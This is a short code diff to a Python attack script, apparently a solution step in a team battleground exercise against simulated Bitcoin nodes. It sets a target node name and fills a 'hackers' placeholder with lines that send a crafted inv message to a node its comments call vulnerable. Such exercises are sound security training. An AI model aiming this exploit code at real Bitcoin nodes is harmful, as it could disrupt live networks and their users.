@@ -50,7 +50,7 @@ class UnknownMessage(Commander):
         # We know this one is vulnderable to an unknown messages based on it's subver
         # Use either reconnaisance or ForkObserver UI to find vulnerable nodes
         # Change this to your teams colour if running in the battleground
-        victim = "TARGET_TANK_NAME.default.svc"
+        victim = "tank-0011-blue.default.svc"
 
         # regtest or signet
         chain = self.nodes[0].chain
@@ -78,7 +78,8 @@ class UnknownMessage(Commander):
         self.log.info("Sent inv message")
 
         self.log.info("Sending inv2 message")
-        # OVER TO YOU HACKERS
+        msg = msg_inv([CInv(MSG_TX, 0x12345)])
+        attacker.send_and_ping(msg)
 
 
 def main():
